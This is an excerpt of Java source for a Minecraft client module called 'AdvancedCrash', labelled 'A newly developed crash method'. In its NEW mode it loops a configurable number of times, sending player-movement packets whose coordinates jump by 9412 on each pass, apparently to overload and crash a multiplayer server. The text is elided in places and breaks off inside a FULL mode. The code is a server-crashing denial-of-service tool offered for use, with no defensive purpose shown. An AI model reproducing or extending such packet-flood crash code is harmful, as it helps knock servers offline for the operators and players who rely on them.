...
public class AdvancedCrash extends Module {
    ...
    public AdvancedCrash() {
        super(Saturn.Crash, "advanced-crash", "A newly developed crash method.");
    }
        ...
        switch (crashMode.get()) {
            case NEW -> {
                for (int i = 0; i < amount.get(); i++) {
                    // Added the second boolean argument for PositionAndOnGround
                    mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                            mc.player.getX() + (9412 * i),
                            mc.player.getY() + (9412 * i),
                            mc.player.getZ() + (9412 * i),
                            true, // onGround state
                            false // additional boolean argument
                    ));
                }
            }
            case OTHER -> {
            ...
            case FULL -> {
                for (int i = 0; i < amount.get(); i++) {
                    // Added the required arguments for Full constructor
